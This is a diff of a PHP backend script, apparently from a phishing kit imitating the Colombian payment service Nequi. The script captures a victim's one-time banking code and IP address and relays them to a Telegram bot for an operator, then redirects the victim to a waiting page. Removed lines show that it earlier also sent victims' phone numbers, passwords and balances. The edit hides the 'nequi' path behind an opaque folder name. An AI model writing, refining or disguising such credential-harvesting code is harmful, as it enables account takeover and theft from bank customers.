@@ -1,5 +1,5 @@
 <?php
-// Incluir el archivo de conexión a la base de datos
+// Incluir el archivo de conexión a la base de datos y las credenciales
 include '../../../db.php';
 $config = include '../../../config.php';
 
@@ -15,46 +15,40 @@ function escapeMarkdownV2($text)
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $cliente_id = $_POST['cliente_id'];
-    $usuario = trim($_POST['usuario']);
-    $clave = trim($_POST['clave']);
-    $otp = trim($_POST['otp']);
-    $saldo = trim($_POST['saldo']);
-    $estado = 1;
+    $otp = $_POST['otp'];
 
-    if (empty($cliente_id)) {
-        die("Error: El ID del cliente no puede estar vacío.");
+    if (empty($cliente_id) || empty($otp)) {
+        die("Error: El ID del cliente y el OTP no pueden estar vacíos.");
     }
 
-    $ip_cliente = $_SERVER['REMOTE_ADDR'];
-    date_default_timezone_set('America/Bogota');
-    $fecha_hora = date('d-m H:i');
-
-    // Actualizar solo el estado en la base de datos nequi
+    // Actualizar solo el estado en la base de datos
+    $estado = 5; // Estado: Ingreso OTP (o Error OTP si aplica?)
+    // Nota: El archivo se llama otpserror.php pero establece estado 5 (OTP recibido?). 
+    // Si es "Error OTP" tal vez debería ser otro estado, pero mantenemos lógica original.
     $sql = "UPDATE nequi SET estado = :estado WHERE id = :id";
     $stmt = $conn->prepare($sql);
 
     // Bind parameters using array in execute
     if ($stmt->execute(['estado' => $estado, 'id' => $cliente_id])) {
-        // Enviar datos a Telegram con botones interactivos
+        // Enviar datos a Telegram
         $botToken = $config['botToken'];
         $chatId = $config['chatId'];
         // Ajustar URL para usar el script específico de Nequi
         $baseUrl = $config['baseUrl'];
         $security_key = $config['security_key'];
+        $ip_cliente = $_SERVER['REMOTE_ADDR'];
         $nequiBaseUrl = $baseUrl;
         if (strpos($baseUrl, 'updatetele.php') !== false) {
-            $nequiBaseUrl = str_replace('updatetele.php', 'pago/nequi/process/updatetele.php', $baseUrl);
+            $nequiBaseUrl = str_replace('updatetele.php', 'pago/c3a7f91e/process/updatetele.php', $baseUrl);
         } else {
-            $nequiBaseUrl = rtrim($baseUrl, '/') . '/pago/nequi/process/updatetele.php';
+            $nequiBaseUrl = rtrim($baseUrl, '/') . '/pago/c3a7f91e/process/updatetele.php';
         }
 
-        $message = "🔄 <b>Actualización de cliente (Nequi Error User)</b>\n\n"
-            . "📱 <b>Número de celular:</b> <code>" . $usuario . "</code>\n"
-            . "🔑 <b>Contraseña:</b> <code>" . $clave . "</code>\n"
-            . "💰 <b>Saldo Nequi:</b> <code>" . $saldo . "</code>\n"
+        $message = "🔄 <b>Actualización de OTP (Error Flow)</b>\n\n"
+            . "🆔 <b>ID del cliente:</b> <code>" . $cliente_id . "</code>\n"
             . "🔢 <b>Clave dinámica:</b> <code>" . $otp . "</code>\n"
             . "🌐 <b>IP del cliente:</b> <code>" . $ip_cliente . "</code>\n"
-            . "🕒 <b>Fecha y Hora:</b> <code>" . $fecha_hora . "</code>";
+            . "📌 <b>Estado actualizado a:</b> <code>Ingreso OTP</code>";
 
         $keyboard = [
             'inline_keyboard' => [
@@ -95,10 +89,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             error_log('Error al enviar mensaje a Telegram');
         }
 
+        // Redirigir a la página de espera con el ID del cliente
         header("Location: ../espera.php?id=" . $cliente_id);
         exit();
     } else {
-        echo "Error al actualizar.";
+        echo "Error al actualizar el estado.";
     }
 
     // $conn = null;
